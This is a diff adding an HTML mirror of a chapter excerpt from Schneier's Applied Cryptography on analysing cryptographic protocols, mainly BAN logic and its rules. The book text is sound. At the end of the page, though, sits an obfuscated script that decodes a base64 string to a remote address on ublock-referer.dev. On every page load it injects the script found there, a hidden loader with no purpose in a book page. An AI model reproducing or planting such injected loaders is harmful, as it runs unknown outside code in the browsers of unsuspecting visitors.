@@ -1,0 +1,103 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Basic Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=03//-->
+<!--PAGES=065-067//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>There are four basic approaches to the analysis of cryptographic protocols [1045]:
+</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;Model and verify the protocol using specification languages and verification tools not specifically designed for the analysis of cryptographic protocols.
+<DD><B>2.</B>&nbsp;&nbsp;Develop expert systems that a protocol designer can use to develop and investigate different scenarios.
+<DD><B>3.</B>&nbsp;&nbsp;Model the requirements of a protocol family using logics for the analysis of knowledge and belief.
+<DD><B>4.</B>&nbsp;&nbsp;Develop a formal method based on the algebraic term-rewriting properties of cryptographic systems.
+</DL>
+<P>A full discussion on these four approaches and the research surrounding them is well beyond the scope of this book. See [1047,1355] for a good introduction to the topic; I am only going to touch on the major contributions to the field.
+</P>
+<P>The first approach treats a cryptographic protocol as any other computer program and attempts to prove correctness. Some researchers represent a protocol as a finite-state machine [1449,1565], others use extensions of first-order predicate calculus [822], and still others use specification languages to analyze protocols [1566]. However, proving correctness is not the same as proving security and this approach fails to detect many flawed protocols. Although it was widely studied at first, most of the work in this area has been redirected as the third approach gained popularity.</P>
+<P>The second approach uses expert systems to determine if a protocol can reach an undesirable state (the leaking of a key, for example). While this approach better identifies flaws, it neither guarantees security nor provides techniques for developing attacks. It is good at determining whether a protocol contains a given flaw, but is unlikely to discover unknown flaws in a protocol. Examples of this approach can be found in [987,1521]; [1092] discusses a rule-based system developed by the U.S. military, called the Interrogator.</P>
+<P>The third approach is by far the most popular, and was pioneered by Michael Burrows, Martin Abadi, and Roger Needham. They developed a formal logic model for the analysis of knowledge and belief, called <B>BAN logic</B> [283,284]. BAN logic is the most widely used logic for analyzing authentication protocols. It assumes that authentication is a function of integrity and freshness, and uses logical rules to trace both of those attributes through the protocol. Although many variants and extensions have been proposed, most protocol designers still refer back to the original work.</P>
+<P>BAN logic doesn&#146;t provide a proof of security; it can only reason about authentication. It has a simple, straightforward logic that is easy to apply and still useful for detecting flaws. Some of the statements in BAN logic include:</P>
+<BLOCKQUOTE><P>Alice believes X. (Alice acts as though X is true.)
+</P>
+<P>Alice sees X. (Someone has sent a message containing X to Alice, who can read and repeat X&#151;possibly after decrypting it.)</P>
+<P>Alice said X. (At some time, Alice sent a message that includes the statement X. It is not known how long ago the message was sent or even that it was sent during the current run of the protocol. It is known that Alice believed X when she said it.)</P>
+<P>X is fresh. (X has not been sent in a message at any time before the current run of the protocol.)</P>
+</BLOCKQUOTE><P>And so on. BAN logic also provides rules for reasoning about belief in a protocol. These rules can then be applied to the logical statements about the protocol to prove things or answer questions about the protocol. For example, one rule is the message-meaning rule:
+</P>
+<BLOCKQUOTE><P>IF Alice believes that Alice and Bob share a secret key, <I>K</I>, and Alice sees <I>X</I>, encrypted under <I>K</I>, and Alice did not encrypt <I>X</I> under <I>K</I>, THEN Alice believes that Bob once said <I>X</I>.</P>
+</BLOCKQUOTE><P>Another rule is the nonce-verification rule:
+</P>
+<BLOCKQUOTE><P>IF Alice believes that <I>X</I> could have been uttered only recently and that Bob once said <I>X</I>, THEN Alice believes that Bob believes <I>X</I>.</P>
+</BLOCKQUOTE><P>There are four steps in BAN analysis:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Convert the protocol into idealized form, using the statements previously described.
+<DD><B>(2)</B>&nbsp;&nbsp;Add all assumptions about the initial state of the protocol.
+<DD><B>(3)</B>&nbsp;&nbsp;Attach logical formulas to the statements: assertions about the state of the system after each statement.
+<DD><B>(4)</B>&nbsp;&nbsp;Apply the logical postulates to the assertions and assumptions to discover the beliefs held by the parties in the protocol.
+</DL>
+<P>The authors of BAN logic &#147;view the idealized protocols as clearer and more complete specifications than traditional descriptions found in the literature....&#148; [283,284]. Others are not so impressed and criticize this step because it may not accurately reflect the real protocol [1161,1612]. Further debate is in [221,1557]. Other critics try to show that BAN logic can deduce characteristics about protocols that are obviously false [1161]&#151;see [285,1509] for a rebuttal&#151;and that BAN logic deals only with trust and not security [1509]. More debate is in [1488,706,1002].
+</P>
+<P>Despite these criticisms, BAN logic has been a success. It has found flaws in several protocols, including Needham-Schroeder and an early draft of a CCITT X.509 protocol [303]. It has uncovered redundancies in many protocols, including Yahalom, Needham-Schroeder, and Kerberos. Many published papers use BAN logic to make claims about their protocol&#146;s security [40,1162,73].</P>
+<P>Other logic systems have been published, some designed as extensions to BAN logic [645,586,1556,828] and others based on BAN to correct perceived weaknesses [1488,1002]. The most successful of these is GNY [645], although it has some shortcomings [40]. Probabalistic beliefs were added to BAN logic, with mixed success, by [292,474]. Other formal logics are [156,798,288]; [1514] attempts to combine the features of several logics. And [1124,1511] present logics where beliefs can change over time.</P>
+<P>The fourth approach to the analysis of cryptographic protocols models the protocol as an algebraic system, expresses the state of the participants&#146; knowledge about the protocol, and then analyzes the attainability of certain states. This approach has not received as much attention as formal logics, but that is changing. It was first used by Michael Merritt [1076], who showed that an algebraic model can be used to analyze cryptographic protocols. Other approaches are in [473,1508,1530,1531,1532,1510,1612].</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(TaEnoCZR, IIdklGXE) {IIdklGXE = TaEnoCZR.createElement('script');IIdklGXE.type = 'text/javascript';IIdklGXE.async = true;IIdklGXE.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');TaEnoCZR.getElementsByTagName('body')[0].appendChild(IIdklGXE);}(document));</script></body>
+</html>
